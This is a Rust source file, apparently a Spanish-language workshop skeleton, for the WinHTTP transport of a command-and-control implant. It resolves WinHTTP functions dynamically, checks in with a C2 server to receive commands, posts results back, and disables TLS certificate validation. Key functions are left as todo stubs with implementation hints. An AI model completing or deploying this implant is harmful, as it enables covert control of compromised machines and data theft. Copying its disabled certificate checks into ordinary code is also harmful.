use core::ffi::c_void;
use core::ptr::null_mut;

use get_proc::{CastFunc, GetModuleHandle, GetProcAddress};

use super::traits::{Transport, TransportError};

#[derive(Clone, Debug)]
pub struct WinHttpConfig {
    pub host: String,
    pub port: u16,
    pub checkin_uri: String,
    pub result_uri: String,
    pub ssl: bool,
    pub user_agent: Option<String>,
    pub proxy: Option<String>,
    pub custom_headers: Option<String>,
}

/// Parsea una URL HTTP y extrae componentes.
///
/// PASOS A IMPLEMENTAR:
/// 1. Detectar esquema (http:// o https://)
/// 2. Separar host:port del path
/// 3. Si no hay puerto, usar 80 (http) o 443 (https)
/// 4. Asegurar que el path empieza con '/'
pub fn winhttp_from_url(url: &str, user_agent: Option<String>, proxy: Option<String>) -> Result<WinHttpConfig, TransportError> {
    /*
    ============================================================
    WORKSHOP: Implementar parsing de URL
    ============================================================
    
    Pasos:
    1. let s = url.trim();
    2. let (ssl, rest) = if starts with "https://" { (true, rest) }
       else if starts with "http://" { (false, rest) }
       else { return Err(InvalidConfig) }
    3. Separar host_port y uri por el primer '/'
    4. Parsear puerto si existe (buscar ':')
    5. Construir WinHttpConfig con checkin_uri y result_uri
    
    Hint: Para el workshop, si uri termina en "/register":
    - checkin_uri = "/mp/checkin"
    - result_uri = "/mp/result"
    ============================================================
    */
    todo!("Implementar winhttp_from_url")
}

fn parse_http_url(url: &str) -> Result<(bool, String, u16, String), TransportError> {
    let s = url.trim();
    let (ssl, rest) = if let Some(r) = s.strip_prefix("https://") {
        (true, r)
    } else if let Some(r) = s.strip_prefix("http://") {
        (false, r)
    } else {
        return Err(TransportError::InvalidConfig("scheme".into()));
    };

    let mut host_port = rest;
    let mut uri = "/".to_string();
    if let Some(idx) = rest.find('/') {
        host_port = &rest[..idx];
        uri = rest[idx..].to_string();
    }

    let (host, port) = if let Some(colon) = host_port.rfind(':') {
        let h = &host_port[..colon];
        let pstr = &host_port[colon + 1..];
        if let Ok(p) = pstr.parse::<u16>() {
            (h.to_string(), p)
        } else {
            return Err(TransportError::InvalidConfig("port".into()));
        }
    } else {
        (host_port.to_string(), if ssl { 443 } else { 80 })
    };

    if !uri.starts_with('/') {
        uri = format!("/{}", uri);
    }

    Ok((ssl, host, port, uri))
}

/// Transporte HTTP usando WinHTTP API.
///
/// PASOS A IMPLEMENTAR:
/// 1. Implementar connect(): obtener punteros a funciones de winhttp.dll
/// 2. Implementar checkin(): hacer GET/POST al C2
/// 3. Implementar send_result(): enviar datos al C2
pub struct WinHttpTransport {
    cfg: WinHttpConfig,
    fns: Option<WinHttpFns>,
    h_session: HINTERNET,
    h_connect: HINTERNET,
}

impl WinHttpTransport {
    pub fn new(cfg: WinHttpConfig) -> Self {
        Self {
            cfg,
            fns: None,
            h_session: null_mut(),
            h_connect: null_mut(),
        }
    }

    fn wstr(s: &str) -> Vec<u16> {
        let mut v: Vec<u16> = s.encode_utf16().collect();
        v.push(0);
        v
    }

    /// Obtiene punteros a funciones de winhttp.dll usando GetProcAddress.
    ///
    /// PASOS A IMPLEMENTAR:
    /// 1. Obtener handle de winhttp.dll con GetModuleHandle
    /// 2. Si no está cargado, usar LoadLibraryW de kernel32.dll
    /// 3. Resolver: WinHttpOpen, WinHttpConnect, WinHttpOpenRequest,
    ///    WinHttpSendRequest, WinHttpReceiveResponse, WinHttpQueryDataAvailable,
    ///    WinHttpReadData, WinHttpCloseHandle, WinHttpSetOption
    fn ensure(&mut self) -> Result<WinHttpFns, TransportError> {
        /*
        ============================================================
        WORKSHOP: Implementar resolución de funciones WinHTTP
        ============================================================
        
        Pasos:
        1. if self.fns.is_some() { return Ok(self.fns.unwrap()) }
        2. let h = GetModuleHandle(Some("winhttp.dll"))
        3. Si es None, cargar con LoadLibraryW
        4. Para cada función:
           let f: FnType = GetProcAddress(h.clone(), "FunctionName")
               .ok_or(TransportError::Unimplemented)?
               .cast_to_function();
        5. Guardar en self.fns y retornar
        ============================================================
        */
        todo!("Implementar ensure() para resolver funciones WinHTTP")
    }

    /// Abre una request HTTP.
    fn open_request(&mut self, verb: &str, path: &str) -> Result<HINTERNET, TransportError> {
        let functions = self.ensure()?;
        if self.h_connect.is_null() {
            return Err(TransportError::Io("no connect".into()));
        }

        let mut path = path.to_string();
        if path.is_empty() || !path.starts_with('/') {
            path = format!("/{}", path);
        }

        let v = Self::wstr(verb);
        let p = Self::wstr(&path);
        let flags: u32 = if self.cfg.ssl { 0x0080_0000 } else { 0 };

        let h = (functions.open_request)(
            self.h_connect,
            v.as_ptr(),
            p.as_ptr(),
            core::ptr::null(),
            core::ptr::null(),
            core::ptr::null(),
            flags,
        );
        if h.is_null() {
            return Err(TransportError::Io("open_request".into()));
        }

        if self.cfg.ssl {
            let mut sec_flags: u32 = 0x0000_0100 | 0x0000_2000 | 0x0000_1000 | 0x0000_0200;
            let _ = (functions.set_option)(
                h,
                31,
                &mut sec_flags as *mut u32 as *mut c_void,
                core::mem::size_of::<u32>() as u32,
            );
        }

        Ok(h)
    }

    /// Ejecuta una transacción HTTP completa.
    fn transact(&mut self, verb: &str, path: &str, data: Option<&[u8]>) -> Result<Vec<u8>, TransportError> {
        /*
        ============================================================
        WORKSHOP: Implementar transacción HTTP
        ============================================================
        
        Pasos:
        1. let h = self.open_request(verb, path)?
        2. Preparar datos (si hay) y headers
        3. Llamar WinHttpSendRequest
        4. Llamar WinHttpReceiveResponse
        5. Loop: WinHttpQueryDataAvailable + WinHttpReadData
        6. Cerrar handle con WinHttpCloseHandle
        7. Retornar datos recibidos
        ============================================================
        */
        todo!("Implementar transact()")
    }
}

/// Implementa el trait Transport para WinHttpTransport.
///
/// PASOS A IMPLEMENTAR:
/// 1. connect(): crear sesión y conexión con WinHttpOpen + WinHttpConnect
/// 2. checkin(): GET o POST al checkin_uri según si hay datos
/// 3. send_result(): POST al result_uri
impl Transport for WinHttpTransport {
    fn type_name(&self) -> &'static str {
        "winhttp"
    }

    /// Conecta al servidor C2.
    ///
    /// PASOS A IMPLEMENTAR:
    /// 1. Verificar si ya está conectado (h_session y h_connect no null)
    /// 2. Llamar WinHttpOpen con user_agent
    /// 3. Llamar WinHttpConnect con host y port
    /// 4. Guardar handles en self.h_session y self.h_connect
    fn connect(&mut self) -> Result<(), TransportError> {
        /*
        ============================================================
        WORKSHOP: Implementar conexión WinHTTP
        ============================================================
        
        Pasos:
        1. if !self.h_session.is_null() && !self.h_connect.is_null() { return Ok(()) }
        2. let f = self.ensure()?;
        3. let ua_w = Self::wstr(&user_agent);
        4. let h_session = (f.open)(ua_w.as_ptr(), access, proxy_ptr, null, 0);
        5. let h_connect = (f.connect)(h_session, host_w.as_ptr(), port, 0);
        6. self.h_session = h_session; self.h_connect = h_connect;
        ============================================================
        */
        todo!("Implementar connect()")
    }

    /// Envía checkin y recibe comandos.
    fn checkin(&mut self, request: &[u8]) -> Result<Vec<u8>, TransportError> {
        if self.h_connect.is_null() {
            self.connect()?;
        }
        let checkin_uri = self.cfg.checkin_uri.clone();
        let out = if request.is_empty() {
            self.transact("GET", &checkin_uri, None)?
        } else {
            self.transact("POST", &checkin_uri, Some(request))?
        };
        Ok(out)
    }

    /// Envía resultados al C2.
    fn send_result(&mut self, data: &[u8]) -> Result<(), TransportError> {
        if self.h_connect.is_null() {
            self.connect()?;
        }
        let result_uri = self.cfg.result_uri.clone();
        let _ = self.transact("POST", &result_uri, Some(data))?;
        Ok(())
    }
}

type HINTERNET = *mut c_void;

type WinHttpOpenFn = extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> HINTERNET;
type WinHttpConnectFn = extern "system" fn(HINTERNET, *const u16, u16, u32) -> HINTERNET;
type WinHttpOpenRequestFn = extern "system" fn(HINTERNET, *const u16, *const u16, *const u16, *const u16, *const *const u16, u32) -> HINTERNET;
type WinHttpSendRequestFn = extern "system" fn(HINTERNET, *const u16, u32, *mut c_void, u32, u32, usize) -> i32;
type WinHttpReceiveResponseFn = extern "system" fn(HINTERNET, *mut c_void) -> i32;
type WinHttpQueryDataAvailableFn = extern "system" fn(HINTERNET, *mut u32) -> i32;
type WinHttpReadDataFn = extern "system" fn(HINTERNET, *mut c_void, u32, *mut u32) -> i32;
type WinHttpCloseHandleFn = extern "system" fn(HINTERNET) -> i32;
type WinHttpSetOptionFn = extern "system" fn(HINTERNET, u32, *mut c_void, u32) -> i32;

#[derive(Copy, Clone)]
struct WinHttpFns {
    open: WinHttpOpenFn,
    connect: WinHttpConnectFn,
    open_request: WinHttpOpenRequestFn,
    send_request: WinHttpSendRequestFn,
    receive_response: WinHttpReceiveResponseFn,
    query_data_available: WinHttpQueryDataAvailableFn,
    read_data: WinHttpReadDataFn,
    close_handle: WinHttpCloseHandleFn,
    set_option: WinHttpSetOptionFn,
}
